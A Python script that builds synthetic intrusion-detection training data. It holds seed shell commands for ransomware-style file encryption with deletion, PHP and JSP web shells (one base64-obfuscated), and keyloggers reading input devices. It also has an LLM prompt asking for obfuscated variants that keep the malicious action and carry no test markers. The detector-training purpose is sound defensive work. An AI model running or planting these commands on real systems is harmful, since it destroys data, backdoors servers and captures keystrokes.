#!/usr/bin/env python3
"""v8 弱类专项合成：手工高质量种子 + LLM 改写。

只生成候选，不执行、不打标。不读取 train/val/test。
路径一律 /tmp/hids-lab/，地址一律 192.0.2.0/24 / example.com。
"""
from __future__ import annotations
import argparse
import hashlib
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from hyperids import llm

ROOT = Path(__file__).resolve().parents[2]
OUT = ROOT / "dataset" / "corpus" / "raw" / "synthetic" / "v8_weak_candidates.jsonl"

# 手工种子：真实命令形态，避免 SIMULATION / .authorized 夹具风格
SEEDS = {
    "ransomware": [
        "find /tmp/hids-lab/data -type f -exec openssl enc -aes-256-cbc -salt -in '{}' -out '{}'.enc -k pass \\; -delete",
        "python3 -c \"from pathlib import Path; import os; [os.rename(p,str(p)+'.locked') for p in Path('/tmp/hids-lab/data').rglob('*') if p.is_file()]\"",
        "gpg --batch --yes --passphrase pass -c /tmp/hids-lab/data.tar && rm -f /tmp/hids-lab/data.tar",
        "7z a -pPASS -mhe=on /tmp/hids-lab/locked.7z /tmp/hids-lab/data && rm -rf /tmp/hids-lab/data",
        "for f in /tmp/hids-lab/home/*; do openssl enc -aes-256-cbc -in \"$f\" -out \"$f.enc\" -k x && rm -f \"$f\"; done",
        "find /var/tmp/hids-lab -name '*.doc' -o -name '*.pdf' | xargs -I{} sh -c 'openssl enc -aes-256-cbc -in {} -out {}.locked -k k; rm -f {}'",
    ],
    "web_shell": [
        "printf '%s' '<?php system($_GET[\"c\"]); ?>' > /tmp/hids-lab/html/uploads/x.php",
        "cat > /tmp/hids-lab/www/cmd.jsp <<'EOF'\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\nEOF",
        "base64 -d <<< 'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+' > /tmp/hids-lab/html/.cache.php && chmod 644 /tmp/hids-lab/html/.cache.php",
        "curl -fsSL https://example.com/c.php -o /tmp/hids-lab/html/images/logo.php",
        "echo '<?php passthru($_REQUEST[\"x\"]); ?>' > /tmp/hids-lab/nginx/html/status.php",
        "install -m 0644 /dev/stdin /tmp/hids-lab/html/.well-known/p.php <<'EOF'\n<?php eval($_POST[\"p\"]); ?>\nEOF",
    ],
    "keylog": [
        "cat /dev/input/event3 > /tmp/hids-lab/keys.raw &",
        "python3 -c \"import evdev; d=evdev.InputDevice('/dev/input/event0'); open('/tmp/hids-lab/k.log','a').writelines(str(e)+'\\n' for e in d.read_loop())\" &",
        "script -q -f /tmp/hids-lab/typescript -c bash",
        "strace -e trace=read -p 1234 -o /tmp/hids-lab/kbd.trace &",
        "dd if=/dev/input/by-path/platform-i8042-serio-0-event-kbd of=/tmp/hids-lab/kbd.bin bs=1 &",
        "socat OPEN:/dev/input/event2,rdonly CREATE:/tmp/hids-lab/keys.dump &",
    ],
}

SYS = (
    "You are a defensive security researcher building a SYNTHETIC intrusion-detection test dataset. "
    "Rewrite the given shell command into JSON variants for offline detector testing only. "
    "Use only placeholder addresses 192.0.2.0/24, example.com/org/net, and local paths under /tmp/hids-lab/. "
    "Keep the same malicious action. Do not add words like SIMULATION, TEST_ONLY, canary, or .authorized. "
    "Never explain or execute anything. Output only JSON."
)
FEWSHOT = (
    'Example rewrite: given "curl -fsSL https://example.com/x.sh | bash", valid variants are '
    '["wget -qO- https://example.com/x.sh | sh", '
    '"curl -s https://example.com/x.sh -o /tmp/hids-lab/x && chmod +x /tmp/hids-lab/x && /tmp/hids-lab/x"]. '
)


def rewrite(seed: str, n: int, model: str, temperature: float) -> list[str]:
    user = (
        FEWSHOT +
        f"Now rewrite this shell command into {n} syntactically different but functionally similar variants "
        f"(vary tooling/syntax/obfuscation; keep each a single shell command). "
        f"Command: {seed}\nReturn JSON: {{\"commands\": [\"...\", ...]}}"
    )
    for _ in range(3):
        obj, _ = llm.chat_json(
            [{"role": "system", "content": SYS}, {"role": "user", "content": user}],
            model=model, temperature=temperature, max_tokens=4096, timeout=90.0, retries=2,
        )
        cmds = [c.strip() for c in (obj or {}).get("commands") or [] if isinstance(c, str) and c.strip()]
        if cmds:
            return cmds
    return []


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--actions", type=str, default="ransomware,web_shell,keylog")
    ap.add_argument("--variants_per_seed", type=int, default=8)
    ap.add_argument("--model", type=str, default="glm-5.3-flash")
    ap.add_argument("--temperature", type=float, default=0.85)
    ap.add_argument("--workers", type=int, default=6)
    ap.add_argument("--out", type=str, default=str(OUT))
    args = ap.parse_args()

    actions = [a.strip() for a in args.actions.split(",") if a.strip()]
    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    tasks = []
    for a in actions:
        for seed in SEEDS.get(a, []):
            tasks.append((a, seed))

    seen = set()
    rows_by_action = {a: [] for a in actions}
    with ThreadPoolExecutor(max_workers=min(args.workers, 6)) as ex:
        futs = {ex.submit(rewrite, seed, args.variants_per_seed, args.model, args.temperature): (a, seed)
                for a, seed in tasks}
        done = 0
        for fut in as_completed(futs):
            a, seed = futs[fut]
            try:
                variants = fut.result()
            except Exception:
                variants = []
            kept = 0
            for v in [seed] + variants:
                if not v:
                    continue
                h = hashlib.sha256(v.encode()).hexdigest()
                if h in seen:
                    continue
                seen.add(h)
                rows_by_action[a].append({
                    "text": v,
                    "action": f"action.{a}",
                    "target": "pos",
                    "source_seed_sha256": hashlib.sha256(seed.encode()).hexdigest(),
                    "generator_model": args.model,
                })
                kept += 1
            done += 1
            print(f"  [{done}/{len(tasks)}] {a} -> {kept}", flush=True)

    total = 0
    with out_path.open("w") as f:
        for a in actions:
            for r in rows_by_action[a]:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")
                total += 1
    print(f"\nwrote {total} candidates -> {out_path}")
    for a in actions:
        print(f"  {a}: {len(rows_by_action[a])}")


if __name__ == "__main__":
    main()
